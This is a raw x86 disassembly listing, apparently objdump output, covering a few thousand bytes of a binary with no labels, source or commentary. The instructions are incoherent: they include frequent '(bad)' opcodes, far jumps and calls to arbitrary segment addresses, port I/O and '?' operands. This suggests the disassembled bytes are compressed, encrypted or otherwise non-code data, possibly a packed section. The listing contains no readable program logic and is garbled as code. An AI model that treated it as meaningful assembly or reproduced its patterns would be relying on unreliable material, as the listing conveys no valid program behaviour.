  415ce3:	jmp    0x9804:0xa05dc291
  415cea:	xchg   edx,eax
  415ceb:	pop    ebp
  415cec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415ced:	call   0x47af:0xddab23b2
  415cf4:	call   0x76b0e53
  415cf9:	(bad)  
  415cfa:	out    dx,al
  415cfb:	out    dx,eax
  415cfc:	(bad)  
  415cfd:	sahf   
  415cfe:	int    0xf9
  415d00:	push   ds
  415d01:	cmp    DWORD PTR [edx],0xffffffb9
  415d04:	aam    0x65
  415d06:	dec    esi
  415d07:	sub    esp,DWORD PTR [ebx-0x5c8ae2e9]
  415d0d:	adc    DWORD PTR [ebx-0x53],esp
  415d10:	fidiv  WORD PTR gs:[ebx]
  415d13:	mov    al,ds:0xe7ec5bb9
  415d18:	fcomp  DWORD PTR [edx-0x126c118f]
  415d1e:	push   es
  415d1f:	pop    ebx
  415d20:	cli    
  415d21:	jge    0x415d6c
  415d23:	mov    ds:0x7c1774a5,eax
  415d28:	mov    ch,BYTE PTR [edx-0x10ce2458]
  415d2e:	std    
  415d2f:	and    ebx,DWORD PTR [esi+edi*4-0x7d]
  415d33:	add    eax,DWORD PTR [esi]
  415d35:	jmp    0x415d9d
  415d37:	pop    ebx
  415d38:	xor    DWORD PTR [ebp+esi*1-0x77],ebp
  415d3c:	mov    bl,0x9f
  415d3e:	inc    DWORD PTR [esp+eiz*4-0x10d43550]
  415d45:	cmp    eax,0x3bb05227
  415d4a:	pop    ss
  415d4b:	add    BYTE PTR [ebx],cl
  415d4d:	pop    ebp
  415d4e:	mov    esi,ss
  415d50:	pop    ecx
  415d51:	add    eax,0x1e34308
  415d56:	add    al,0xdc
  415d58:	retf   0x120b
  415d5b:	sbb    eax,0x6c3647f7
  415d60:	push   0xf4985e3e
  415d65:	call   0x737ce994
  415d6a:	sbb    cl,BYTE PTR [edi]
  415d6c:	pop    ss
  415d6d:	pop    eax
  415d6e:	neg    DWORD PTR [ecx-0x3b]
  415d71:	cdq    
  415d72:	stc    
  415d73:	add    BYTE PTR [ecx],0x99
  415d76:	into   
  415d77:	ins    BYTE PTR es:[edi],dx
  415d78:	sbb    al,0xc5
  415d7a:	jo     0x415d37
  415d7c:	pop    ecx
  415d7d:	fnstenv [edx-0x71e2b96c]
  415d83:	fist   DWORD PTR [eax-0x1f]
  415d86:	dec    edi
  415d87:	jg     0x415d2b
  415d89:	std    
  415d8a:	es repz mov bl,0x62
  415d8e:	xor    BYTE PTR [ecx+0x210926e9],al
  415d94:	(bad)  
  415d96:	fisttp QWORD PTR [edx+0x3da4428e]
  415d9c:	dec    esi
  415d9d:	cmp    DWORD PTR [ebx-0x17],edi
  415da0:	daa    
  415da1:	mov    ch,BYTE PTR [ebp+0x31323cd]
  415da7:	loope  0x415dde
  415da9:	mov    eax,0xf73f3d49
  415dae:	out    dx,al
  415daf:	jge    0x415e16
  415db1:	sbb    DWORD PTR [esi-0x153adbd9],esp
  415db7:	in     al,dx
  415db8:	xor    DWORD PTR [esi],0xffffffff
  415dbb:	cld    
  415dbc:	dec    ebx
  415dbd:	es sbb ebx,ebx
  415dc0:	sub    eax,0xb38f25f8
  415dc5:	or     DWORD PTR [eax-0x3c],ebx
  415dc8:	mov    ch,0xe1
  415dca:	jne    0x415d5a
  415dcc:	xchg   esp,eax
  415dcd:	jle    0x415ddb
  415dcf:	mov    ecx,ebx
  415dd1:	stos   BYTE PTR es:[edi],al
  415dd2:	inc    edi
  415dd3:	dec    edi
  415dd4:	test   al,0x3b
  415dd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415dd7:	pop    esp
  415dd8:	xor    al,0x8a
  415dda:	jne    0x415e50
  415ddc:	xor    eax,DWORD PTR [edi+edi*8-0x75]
  415de0:	adc    DWORD PTR [ebp+0xa],edx
  415de3:	xchg   esp,eax
  415de4:	fldcw  WORD PTR [esi+0x6e]
  415de7:	jecxz  0x415d71
  415de9:	mov    edi,0x974074b3
  415dee:	in     al,dx
  415def:	pop    ecx
  415df0:	into   
  415df1:	pop    edx
  415df2:	inc    ecx
  415df3:	retf   
  415df4:	fsubr  st,st(1)
  415df6:	xor    DWORD PTR [ebx-0x53],ebp
  415df9:	ret    0x39f5
  415dfc:	jl     0x415de0
  415dfe:	cmp    eax,0x2f775101
  415e03:	cmp    DWORD PTR [edi-0x6d],edi
  415e06:	pusha  
  415e07:	sub    BYTE PTR [esi+0x9],bh
  415e0a:	stos   BYTE PTR es:[edi],al
  415e0b:	xchg   ebx,eax
  415e0c:	pop    edx
  415e0d:	imul   edi,esi,0x35
  415e10:	sub    eax,esi
  415e12:	fldln2 
  415e14:	dec    ecx
  415e15:	cmp    eax,0x1b698663
  415e1a:	aaa    
  415e1b:	outs   dx,DWORD PTR ds:[esi]
  415e1c:	cli    
  415e1d:	dec    edi
  415e1e:	loopne 0x415e04
  415e20:	mov    al,0x6d
  415e22:	(bad)  
  415e23:	jns    0x415df2
  415e25:	xchg   ebp,eax
  415e26:	jp     0x415dbd
  415e28:	cmp    al,0x36
  415e2a:	xchg   ecx,eax
  415e2b:	in     eax,dx
  415e2c:	mov    cl,0x42
  415e2e:	adc    esp,DWORD PTR [eax+0x45eadfe5]
  415e34:	and    ecx,eax
  415e36:	out    dx,eax
  415e37:	ja     0x415e22
  415e39:	mov    ds:0x4df4677c,al
  415e3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e3f:	stc    
  415e40:	icebp  
  415e41:	stos   BYTE PTR es:[edi],al
  415e42:	mov    gs,WORD PTR [eax-0x4d7626f3]
  415e48:	(bad)  
  415e49:	fdivr  DWORD PTR [eax-0x7e6c68a]
  415e4f:	adc    DWORD PTR [edx],esi
  415e51:	fcom   DWORD PTR [ebp+0x290e66ab]
  415e57:	jno    0x415e65
  415e59:	popf   
  415e5a:	and    BYTE PTR [edx-0x74889aa9],bl
  415e60:	dec    edx
  415e61:	or     dh,BYTE PTR [eax-0x43]
  415e64:	mov    ds:0x5b30ff93,al
  415e69:	push   0x38
  415e6b:	cli    
  415e6c:	push   esp
  415e6d:	sbb    ch,BYTE PTR cs:[ecx]
  415e70:	push   es
  415e71:	sbb    eax,0x96ba9ad5
  415e76:	sti    
  415e77:	xor    eax,0xbacc345b
  415e7c:	dec    ebp
  415e7d:	outs   dx,DWORD PTR ds:[esi]
  415e7e:	iret   
  415e7f:	lock int 0x4b
  415e82:	pop    ds
  415e83:	mov    dl,0x1c
  415e85:	inc    esp
  415e86:	fnstsw WORD PTR [ecx+0x18c2b098]
  415e8c:	xor    ebx,edx
  415e8e:	sbb    eax,0xdd9f53db
  415e93:	pop    esp
  415e94:	mov    edi,0xd8ffec2e
  415e99:	mov    ebp,?
  415e9b:	aaa    
  415e9c:	pop    edx
  415e9d:	(bad)  
  415e9e:	scas   al,BYTE PTR es:[edi]
  415e9f:	arpl   bx,bp
  415ea1:	cmp    eax,0x1dae3603
  415ea6:	jae    0x415e59
  415ea8:	(bad)  
  415ea9:	xchg   ecx,eax
  415eaa:	xchg   BYTE PTR [edi+0x4bd6a7d2],cl
  415eb0:	repz (bad) 
  415eb3:	sbb    al,0x6f
  415eb5:	in     eax,0xa9
  415eb7:	or     DWORD PTR [edx-0x16],eax
  415eba:	mov    ch,0xc0
  415ebc:	mov    eax,0xa0991dda
  415ec1:	jno    0x415ef9
  415ec3:	in     eax,dx
  415ec4:	retf   0x3901
  415ec7:	pop    edx
  415ec8:	inc    ebx
  415ec9:	ss or  eax,0x69a7b9f7
  415ecf:	jmp    0x415ede
  415ed1:	adc    eax,0x93304b91
  415ed6:	repz lds ecx,FWORD PTR [edx]
  415ed9:	inc    eax
  415eda:	jecxz  0x415e9f
  415edc:	fbstp  TBYTE PTR [esi+0x1]
  415edf:	cli    
  415ee0:	stc    
  415ee1:	mov    esi,DWORD PTR [esi]
  415ee3:	push   ss
  415ee4:	adc    dl,BYTE PTR [eax+0x3c]
  415ee7:	sti    
  415ee8:	sub    ah,BYTE PTR [esi+0x46]
  415eeb:	cmp    eax,0x5dfa57be
  415ef1:	push   edi
  415ef2:	push   cs
  415ef3:	call   0xb0cb:0x38e4904
  415efa:	(bad)  
  415efc:	mov    ss,esp
  415efe:	test   eax,0x9ac6cac2
  415f03:	cmp    eax,0xd13b4e65
  415f08:	mov    edx,0x1ebd3a34
  415f0d:	(bad)  
  415f0f:	jecxz  0x415f13
  415f11:	repz sub eax,0x5a773f9
  415f17:	fcomp  QWORD PTR [eax]
  415f19:	rcr    DWORD PTR [esi-0x7e],0xea
  415f1d:	inc    edx
  415f1e:	adc    dh,BYTE PTR [ecx-0x2c7c9a1e]
  415f24:	xor    DWORD PTR [ebx],esp
  415f26:	inc    ebp
  415f27:	cmp    DWORD PTR [ecx+0x4965d03e],esp
  415f2d:	lahf   
  415f2e:	clc    
  415f2f:	pop    eax
  415f30:	xchg   edx,eax
  415f31:	jmp    0x415efd
  415f33:	pushf  
  415f34:	cli    
  415f35:	sub    edx,DWORD PTR [edx-0x786a4c3d]
  415f3b:	add    eax,0xf89825d8
  415f40:	pop    ss
  415f41:	iret   
  415f42:	push   ebx
  415f43:	jle    0x415fb8
  415f45:	arpl   WORD PTR [edi+0x1b10b713],si
  415f4b:	jge    0x415eea
  415f4d:	sbb    BYTE PTR [edi-0x74],bh
  415f50:	mov    ds:0x90e64312,al
  415f55:	out    dx,eax
  415f56:	jl     0x415f9e
  415f58:	fs dec esi
  415f5a:	fisttp QWORD PTR [edx]
  415f5c:	add    eax,0x3da5f1b
  415f61:	rol    DWORD PTR [edx-0x4d],0x87
  415f65:	adc    al,0x7
  415f67:	pop    ss
  415f68:	lds    esp,FWORD PTR [esi]
  415f6a:	aaa    
  415f6b:	pop    ss
  415f6c:	and    ebx,DWORD PTR [edi+edi*1+0xb7585f4]
  415f73:	loopne 0x415f00
  415f75:	add    DWORD PTR [ebp-0x280998c5],ebp
  415f7b:	jmp    0x415f69
  415f7d:	hlt    
  415f7e:	dec    ebx
  415f7f:	jmp    0x415ff6
  415f81:	lahf   
  415f82:	pop    esp
  415f83:	mov    eax,0x3d745ce2
  415f88:	(bad)  
  415f89:	test   esi,0x4e5967ee
  415f8f:	clts   
  415f91:	sub    ecx,DWORD PTR [ebp+0x2b]
  415f94:	cdq    
  415f95:	ret    
  415f96:	(bad)  [ebx]
  415f98:	pop    ebp
  415f99:	xchg   eax,edi
  415f9b:	adc    eax,0x261d7349
  415fa0:	imul   ebp,DWORD PTR [edi+esi*2-0x6195d5a6],0xe0b876f0
  415fab:	jb     0x415fa3
  415fad:	push   ebp
  415fae:	mov    bl,dh
  415fb0:	in     al,dx
  415fb1:	adc    BYTE PTR fs:[eax],al
  415fb4:	cmp    al,al
  415fb6:	loopne 0x415fd6
  415fb8:	rcl    DWORD PTR [ebx+0x2d],0x19
  415fbc:	into   
  415fbd:	test   al,0xff
  415fbf:	cmp    al,bh
  415fc1:	ds loope 0x415fa4
  415fc4:	dec    esp
  415fc5:	push   0xa1cb92dd
  415fca:	fld    QWORD PTR [ebp+0x72edcc]
  415fd0:	mov    DWORD PTR [edx-0x13],0xd1d683f4
  415fd7:	dec    esi
  415fd8:	push   esi
  415fd9:	mov    ebx,0x887bfa18
  415fde:	adc    BYTE PTR [edi+0x189b6186],dh
  415fe4:	mov    ds:0x182d1049,eax
  415fe9:	push   ds
  415fea:	cmp    eax,0x417bb6
  415fef:	sbb    BYTE PTR [eax+esi*1],bh
  415ff2:	adc    al,0x79
  415ff4:	das    
  415ff5:	mov    eax,ds:0xe0c5798
  415ffa:	sub    bl,BYTE PTR [edx+0x3b70397d]
  416000:	inc    ebp
  416001:	adc    esp,DWORD PTR [ebx+eax*4+0x3]
  416005:	fwait
  416006:	gs dec eax
  416008:	push   eax
  416009:	or     bl,BYTE PTR [edx-0x12f3dd6f]
  41600f:	mov    bh,0xaf
  416011:	(bad)  
  416012:	mov    ch,0xfc
  416014:	add    bh,al
  416016:	in     al,0x76
  416018:	push   ecx
  416019:	jle    0x41604b
  41601b:	mov    ebp,0xd8e31b4e
  416020:	xchg   edx,eax
  416021:	push   ebx
  416022:	lds    edi,FWORD PTR [esi+0x6e]
  416025:	or     ecx,DWORD PTR [edx]
  416027:	loopne 0x415fc9
  416029:	mov    al,0xec
  41602b:	inc    edi
  41602c:	das    
  41602d:	cli    
  41602e:	mov    cl,0xe7
  416030:	jge    0x416089
  416032:	js     0x4160b1
  416034:	stc    
  416035:	sbb    DWORD PTR [ebp-0x18809a5f],esi
  41603b:	mov    ecx,0x17550dd0
  416040:	jae    0x416068
  416042:	stos   DWORD PTR es:[edi],eax
  416043:	inc    eax
  416044:	int3   
  416045:	dec    esp
  416046:	loopne 0x41600a
  416048:	dec    ebx
  416049:	enter  0x1320,0xc2
  41604d:	mov    ds:0x26792921,eax
  416052:	push   ebx
  416053:	ret    0x2b68
  416056:	jg     0x41604a
  416058:	(bad)  [ebx-0x6c9b8e87]
  41605e:	xchg   edi,eax
  41605f:	pushf  
  416060:	xor    ebx,DWORD PTR [esi+ebp*2+0x51cd0c14]
  416067:	repnz int3 
  416069:	sbb    BYTE PTR [ebx+0x10],al
  41606c:	adc    DWORD PTR [ecx],esp
  41606e:	dec    edi
  41606f:	es ss mov dh,0xa9
  416073:	jmp    0x88879a1a
  416078:	test   esi,0x8d94821a
  41607e:	push   ss
  41607f:	sub    esi,DWORD PTR [edi-0x43555045]
  416085:	outs   dx,BYTE PTR ds:[esi]
  416086:	sbb    dh,0x74
  416089:	fucomip st,st(0)
  41608b:	mov    ds:0x3fff1136,al
  416090:	jno    0x41610b
  416092:	pop    ds
  416093:	adc    eax,0xde84e0b8
  416098:	ficomp WORD PTR [esi+ebp*8-0x19]
  41609c:	xchg   ebx,eax
  41609d:	cmc    
  41609e:	aam    0x5b
  4160a0:	addr16 jns 0x4160a2
  4160a3:	dec    BYTE PTR [ebx]
  4160a5:	sahf   
  4160a6:	ficomp WORD PTR [edx+ebp*1-0x6a]
  4160aa:	aam    0xf0
  4160ac:	inc    edi
  4160ad:	in     al,0xce
  4160af:	add    cl,0x83
  4160b2:	xchg   edi,eax
  4160b3:	xor    DWORD PTR [esi+0x4833d1d9],0xffffff81
  4160ba:	xor    al,0x9a
  4160bc:	aas    
  4160bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4160be:	int    0xe1
  4160c0:	and    BYTE PTR [ecx+esi*1-0x27b0a786],ah
  4160c7:	cli    
  4160c8:	outs   dx,BYTE PTR ds:[esi]
  4160c9:	mov    ebx,0xfd7d2ff1
  4160ce:	scas   eax,DWORD PTR es:[edi]
  4160cf:	outs   dx,DWORD PTR ds:[esi]
  4160d0:	dec    edx
  4160d1:	fwait
  4160d2:	ret    
  4160d3:	test   eax,0xdcf576ea
  4160d8:	cmp    eax,0xe9fd83ec
  4160dd:	int    0x33
  4160df:	fsubr  QWORD PTR [ebp+0x4a8c6e20]
  4160e5:	ja     0x4160c0
  4160e7:	add    DWORD PTR [esi-0x7a88bfe9],esi
  4160ed:	lds    eax,FWORD PTR [ecx-0x5af931f0]
  4160f3:	adc    edi,DWORD PTR [ecx+0x7bde7d3e]
  4160f9:	out    dx,al
  4160fa:	addr16 or al,0x1d
  4160fd:	jno    0x41613e
  4160ff:	shl    esi,0x8a
  416102:	xor    edx,DWORD PTR [ecx+0x74]
  416105:	mov    bh,0x3e
  416107:	add    BYTE PTR [ecx+0x26],0xb4
  41610b:	xchg   edi,eax
  41610c:	or     ch,bh
  41610e:	adc    cl,ch
  416110:	cmp    DWORD PTR [ecx-0x53],0x8cf50f17
  416117:	push   esp
  416118:	mov    DWORD PTR [ebx-0x691b886a],edx
  41611e:	scas   eax,DWORD PTR es:[edi]
  41611f:	scas   eax,DWORD PTR es:[edi]
  416120:	jp     0x416125
  416122:	push   edx
  416123:	das    
  416124:	jmp    0xc440:0xc0d097b6
  41612b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41612c:	mov    ebx,0x1122c54a
  416131:	and    eax,DWORD PTR [ebx-0x52a3d284]
  416137:	adc    dh,BYTE PTR [edx-0x4e]
  41613a:	hlt    
  41613b:	fistp  WORD PTR [ebx+0x1dc56422]
  416141:	cmp    dh,al
  416143:	fcomp  DWORD PTR [ebp-0x4cffc327]
  416149:	rol    BYTE PTR [esi-0x5dab8446],0xe8
  416150:	(bad)  
  416151:	adc    ch,dl
  416153:	shl    DWORD PTR [ebp-0x40fe1a17],1
  416159:	and    dh,BYTE PTR [edi+0x7c]
  41615c:	js     0x4160e1
  41615e:	add    ebx,DWORD PTR [ebp-0x11793acf]
  416164:	lods   eax,DWORD PTR ds:[esi]
  416165:	mov    esi,0xdb71a65e
  41616a:	(bad)  
  41616b:	fnstsw WORD PTR [ecx+ecx*1-0x48]
  41616f:	xor    BYTE PTR [edx-0xcb8691d],dl
  416175:	gs sbb ecx,edx
  416178:	mov    cl,0x11
  41617a:	add    edx,DWORD PTR [ebp+0x2f]
  41617d:	in     al,dx
  41617e:	stos   DWORD PTR es:[edi],eax
  41617f:	lods   eax,DWORD PTR ds:[esi]
  416180:	addr16 push ss
  416182:	(bad)  
  416183:	and    edi,DWORD PTR [ebp-0x7875eb05]
  416189:	std    
  41618a:	fisttp WORD PTR [ebx-0x10]
  41618d:	repz out dx,eax
  41618f:	sbb    eax,0x9d142c2
  416194:	jmp    0x9634:0xfb93fddf
  41619b:	inc    edx
  41619c:	psrad  mm1,QWORD PTR [esi+0x4c]
  4161a0:	add    bh,BYTE PTR [ebx]
  4161a2:	cmp    ebp,DWORD PTR [edi-0x41]
  4161a5:	or     eax,ecx
  4161a7:	mov    esp,0x72db082e
  4161ac:	pusha  
  4161ad:	mov    bl,0x41
  4161af:	push   ecx
  4161b0:	mov    ebp,0x42c26cf7
  4161b5:	pop    esi
  4161b6:	jmp    0xf387:0x52421358
  4161bd:	jo     0x4161c9
  4161bf:	xchg   DWORD PTR [ebp+0x34],ecx
  4161c2:	mov    dl,0x4f
  4161c4:	addr16 jne 0x416189
  4161c7:	(bad)  
  4161c8:	jl     0x416163
  4161ca:	and    ecx,DWORD PTR [ebp+0x51b2f307]
  4161d0:	adc    al,0xac
  4161d2:	pop    eax
  4161d3:	or     BYTE PTR [esi-0x6b],0xf2
  4161d7:	je     0x4161cc
  4161d9:	add    al,0x4a
  4161db:	xchg   esp,eax
  4161dc:	dec    ebx
  4161dd:	cmp    eax,0x57482be4
  4161e2:	cwde   
  4161e3:	mov    esi,0x6f67e41c
  4161e8:	dec    edi
  4161e9:	jns    0x41618a
  4161eb:	pop    es
  4161ec:	jb     0x416243
  4161ee:	and    DWORD PTR [ebx],esp
  4161f0:	sbb    dl,ch
  4161f2:	jae    0x41622e
  4161f4:	daa    
  4161f5:	cmp    ebp,0xa3e788bd
  4161fb:	inc    eax
  4161fc:	cdq    
  4161fd:	mov    edx,0xc829b767
  416202:	inc    ebp
  416203:	cmp    esp,ebx
  416205:	push   es
  416206:	adc    edx,DWORD PTR [eax+esi*1-0x4461ee4]
  41620d:	inc    edx
  41620e:	jbe    0x416244
  416210:	stc    
  416211:	outs   dx,BYTE PTR ds:[esi]
  416212:	adc    BYTE PTR ds:0xc7c8cde,dh
  416218:	xlat   BYTE PTR ds:[ebx]
  416219:	test   BYTE PTR [esi],dh
  41621b:	xchg   ebx,esi
  41621d:	ret    
  41621e:	stos   BYTE PTR es:[edi],al
  41621f:	sub    ecx,ecx
  416221:	xchg   ebx,eax
  416222:	fist   DWORD PTR [edx-0x2b]
  416225:	and    al,BYTE PTR ds:0xbc4ce811
  41622b:	jno    0x4162a9
  41622d:	nop
  41622e:	loop   0x416267
  416230:	outs   dx,DWORD PTR ds:[esi]
  416231:	push   edx
  416232:	out    0x1b,eax
  416234:	gs pop edx
  416236:	sub    ecx,DWORD PTR [edi+0x1cb7a3ce]
  41623c:	mov    ds:0x7c7a0158,eax
  416241:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416242:	ficom  WORD PTR [esi-0x71]
  416245:	jp     0x4161ed
  416247:	push   edx
  416248:	push   0xffffffc6
  41624a:	mov    eax,ds:0x6ccb6ad0
  41624f:	jae    0x4162b1
  416251:	mov    BYTE PTR [ebx+esi*4+0x34090831],ah
  416258:	or     ebp,DWORD PTR [ebp-0x53df9f0]
  41625e:	fld    TBYTE PTR [eax+0x3]
  416261:	bound  edi,QWORD PTR ds:0x341b1a89
  416267:	xor    eax,0x2816120a
  41626c:	jle    0x4162ad
  41626e:	mov    ebp,0x7b85b89f
  416273:	ins    DWORD PTR es:[edi],dx
  416274:	pop    esi
  416275:	inc    ebx
  416276:	inc    ebp
  416277:	jnp    0x4162e7
  416279:	out    dx,al
  41627a:	call   0x4925dc22
  41627f:	xor    ah,BYTE PTR [esi-0x1e4e8962]
  416285:	mov    eax,0x59223a37
  41628a:	push   ebp
  41628b:	dec    eax
  41628c:	neg    bh
  41628e:	je     0x416273
  416290:	daa    
  416291:	(bad)  
  416292:	icebp  
  416293:	cdq    
  416294:	iret   
  416295:	xchg   edx,eax
  416296:	sbb    DWORD PTR [ebp-0x64],0x70
  41629a:	sar    DWORD PTR ds:[esi+esi*4-0x79a019e3],0xc7
  4162a3:	arpl   WORD PTR [eax-0x4a],bx
  4162a6:	leave  
  4162a7:	and    BYTE PTR [edx-0x6842dda4],ch
  4162ad:	fmulp  st(2),st
  4162af:	xchg   ebp,eax
  4162b0:	mov    bl,0x1f
  4162b2:	mov    bh,0x64
  4162b4:	pushf  
  4162b5:	jmp    0x585d:0x96f023fb
  4162bc:	sti    
  4162bd:	in     al,0x83
  4162bf:	add    bl,cl
  4162c1:	push   esp
  4162c2:	jne    0x416339
  4162c4:	adc    BYTE PTR [ebp+0x1e08552a],0x35
  4162cb:	sub    ebx,edi
  4162cd:	les    ebx,FWORD PTR [ecx-0x1a]
  4162d0:	lea    ecx,[edi]
  4162d2:	xor    eax,0xcbc34f0e
  4162d7:	mov    bl,0x71
  4162d9:	xchg   WORD PTR cs:[esi],cx
  4162dd:	jno    0x4162f8
  4162df:	mov    edi,DWORD PTR [esi-0x78825bfc]
  4162e5:	loop   0x416339
  4162e7:	xlat   BYTE PTR ds:[ebx]
  4162e8:	sub    ah,BYTE PTR [edi+ecx*2+0x2adcc5bb]
  4162ef:	cmp    dl,BYTE PTR [ebx+eiz*1]
  4162f2:	or     eax,0xe34d8f0d
  4162f7:	call   0x78bb:0xdef5342
  4162fe:	jnp    0x416302
  416300:	cmp    al,0xd8
  416302:	das    
  416303:	cdq    
  416304:	mov    ecx,0xc27a1d85
  416309:	mov    ah,0xf0
  41630b:	mov    esp,0x4d87e120
  416310:	aaa    
  416311:	fdivp  st(3),st
  416313:	das    
  416314:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416315:	imul   eax,DWORD PTR [esi+edi*4+0x7d14d750],0xffffffff
  41631d:	push   eax
  41631e:	fs into 
  416320:	add    BYTE PTR [eax-0x716d6fdb],0xd7
  416327:	leave  
  416328:	les    edi,FWORD PTR [ebx]
  41632a:	xor    DWORD PTR [ecx],edx
  41632c:	mov    ch,0x6e
  41632e:	sbb    BYTE PTR [eax+0x24],0xaa
  416332:	xor    DWORD PTR [eax+0x6f],edi
  416335:	call   FWORD PTR [edi+0x7d]
  416338:	pop    ebp
  416339:	pop    ebp
  41633a:	mov    cl,0xdb
  41633c:	inc    ebx
  41633d:	jmp    0x7ac6:0xb4bf964e
  416344:	push   cs
  416345:	adc    eax,0x4dbf3e25
  41634a:	mov    esp,0xdd321830
  41634f:	or     cl,BYTE PTR [eax+0x6f646eec]
  416355:	ret    
  416356:	push   ebx
  416357:	in     eax,0x4d
  416359:	imul   BYTE PTR [esi+0x718da6f1]
  41635f:	fld    QWORD PTR [ebx]
  416361:	fcmovnu st,st(6)
  416363:	retf   
  416364:	dec    esp
  416365:	retf   0xe5b9
  416368:	dec    eax
  416369:	(bad)  
  41636a:	adc    cl,bh
  41636c:	sub    bh,BYTE PTR [edx+eax*8]
  41636f:	mov    WORD PTR ds:0xe24a3cd9,fs
  416375:	aas    
  416376:	xchg   edi,esi
  416378:	sbb    BYTE PTR [edx-0x4627ef1e],bh
  41637e:	adc    eax,0x9f843db6
  416383:	pop    ecx
  416384:	fldenv [edi+eiz*8+0x56]
  416388:	fild   DWORD PTR [esp+0x1a]
  41638c:	ret    0xf16a
  41638f:	ret    0x3c46
  416392:	fwait
  416393:	aas    
  416394:	sahf   
  416395:	push   0x5952d59d
  41639a:	sbb    cl,BYTE PTR [ebx+0x6d]
  41639d:	and    bl,bh
  41639f:	mov    edi,0xc337a573
  4163a4:	hlt    
  4163a5:	xchg   ebp,eax
  4163a6:	dec    esi
  4163a7:	inc    ebp
  4163a8:	push   ss
  4163a9:	pushf  
  4163aa:	ss inc esp
  4163ac:	push   esp
  4163ad:	mov    cl,0x1e
  4163af:	fsubr  QWORD PTR [ebx+0x24]
  4163b2:	xor    eax,0xa640fd25
  4163b7:	scas   al,BYTE PTR es:[edi]
  4163b8:	call   0xd67514d2
  4163bd:	push   es
  4163be:	hlt    
  4163bf:	aad    0x17
  4163c1:	imul   ecx,DWORD PTR [edi+0x22],0x7eda5993
  4163c8:	out    0x5a,al
  4163ca:	add    al,0x66
  4163cc:	jp     0x416428
  4163ce:	lods   eax,DWORD PTR ds:[esi]
  4163cf:	enter  0x3fc6,0x9d
  4163d3:	jne    0x4163a4
  4163d5:	sbb    al,0xcf
  4163d7:	retf   0x9214
  4163da:	scas   eax,DWORD PTR es:[edi]
  4163db:	pop    ecx
  4163dc:	popw   ds
  4163de:	jecxz  0x416459
  4163e0:	push   0xfa420a4b
  4163e5:	xchg   ebx,eax
  4163e6:	adc    ah,bl
  4163e8:	xor    ah,BYTE PTR [ebp+esi*8-0x43]
  4163ec:	ret    0x4063
  4163ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4163f0:	xor    ebx,DWORD PTR [esi]
  4163f2:	out    dx,al
  4163f3:	inc    ebp
  4163f4:	imul   edx,esi,0xf9d08cbc
  4163fa:	pop    ds
  4163fb:	ret    0xce9d
  4163fe:	sub    cl,BYTE PTR [edi+0x75]
  416401:	mov    esp,0x2f65c8a8
  416406:	push   eax
  416407:	jb     0x4163e3
  416409:	test   DWORD PTR ds:0xcc226a1f,edi
  41640f:	ja     0x41647e
  416411:	jge    0x41640d
  416413:	ins    DWORD PTR es:[edi],dx
  416414:	and    BYTE PTR [edi],ah
  416416:	fsubr  QWORD PTR [ebx]
  416418:	push   es
  416419:	ret    
  41641a:	jo     0x4163d0
  41641c:	jmp    0x4163e4
  41641e:	cmp    al,0xd8
  416420:	xor    BYTE PTR [edi+0x8825912],0xed
  416427:	xchg   edx,eax
  416428:	mov    ?,WORD PTR [edx]
  41642a:	scas   eax,DWORD PTR es:[edi]
  41642b:	pop    es
  41642c:	outs   dx,BYTE PTR ds:[esi]
  41642d:	mov    edx,0x3daceaa3
  416432:	loop   0x416435
  416434:	sub    al,0x81
  416436:	(bad)  
  416437:	mov    ebp,db2
  41643a:	and    al,0xfe
  41643c:	neg    DWORD PTR [esi+0xe3fc8fd]
  416442:	mov    eax,ds:0x7b07fb42
  416447:	mov    esp,0x7eb1fa13
  41644c:	lods   al,BYTE PTR ds:[esi]
  41644d:	mov    ebp,DWORD PTR [ebx+0x4c]
  416450:	fs mov ecx,0x4fee4b6e
  416456:	mov    ebp,0xc0775628
  41645b:	out    0xf3,al
  41645d:	lds    esp,FWORD PTR [ebx-0x21]
  416460:	fwait
  416461:	rcl    DWORD PTR [edx-0x559da4c5],0xe2
  416468:	lods   al,BYTE PTR ds:[esi]
  416469:	jb     0x4164cd
  41646b:	cmc    
  41646c:	lods   eax,DWORD PTR ds:[esi]
  41646d:	in     eax,0x5f
  41646f:	int3   
  416470:	add    BYTE PTR [edi+0x7490e98c],bh
  416476:	pop    ss
  416477:	add    ah,ah
  416479:	call   0xac96514d
  41647e:	loope  0x41640d
  416480:	jo     0x416444
  416482:	outs   dx,DWORD PTR ds:[esi]
  416483:	repz and al,0xeb
  416486:	cmp    ebp,esi
  416488:	int    0x37
  41648a:	lds    edx,FWORD PTR [ebx-0x6f]
  41648d:	ret    
  41648e:	ds es inc sp
  416492:	in     eax,dx
  416493:	dec    ecx
  416494:	jne    0x416508
  416496:	mov    ?,edx
  416498:	dec    ebp
  416499:	in     eax,dx
  41649a:	cmp    DWORD PTR [esi],ecx
  41649c:	xchg   BYTE PTR [ecx-0x4a37fd2],bl
  4164a2:	push   0xfffffff5
  4164a4:	clc    
  4164a5:	arpl   ax,si
  4164a7:	push   esp
  4164a8:	retf   0x29c0
  4164ab:	popa   
  4164ac:	ins    BYTE PTR es:[edi],dx
  4164ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4164ae:	adc    al,0x79
  4164b0:	sub    cl,0x2f
  4164b3:	cld    
  4164b4:	pop    eax
  4164b5:	lea    ebp,[ecx+0xa7039b8]
  4164bb:	xchg   esp,eax
  4164bc:	(bad)  [eax+0x537f382b]
  4164c2:	dec    eax
  4164c3:	ror    DWORD PTR [ebp+0x9],1
  4164c6:	aad    0xa3
  4164c8:	mov    WORD PTR [edi-0x65],ss
  4164cb:	aaa    
  4164cc:	dec    edx
  4164cd:	push   0xc416432
  4164d2:	pop    esp
  4164d3:	dec    edi
  4164d4:	cld    
  4164d5:	in     al,0x98
  4164d7:	js     0x4164cd
  4164d9:	mov    al,0x50
  4164db:	or     ch,BYTE PTR [ebx+0x49]
  4164de:	mov    dl,0x4c
  4164e0:	fs das 
  4164e2:	lock mov WORD PTR [ebx-0x1b],es
  4164e6:	rcl    BYTE PTR [esi+0x5646e2e5],1
  4164ec:	lock pop edi
  4164ee:	push   edi
  4164ef:	sbb    eax,0x1a8f85f
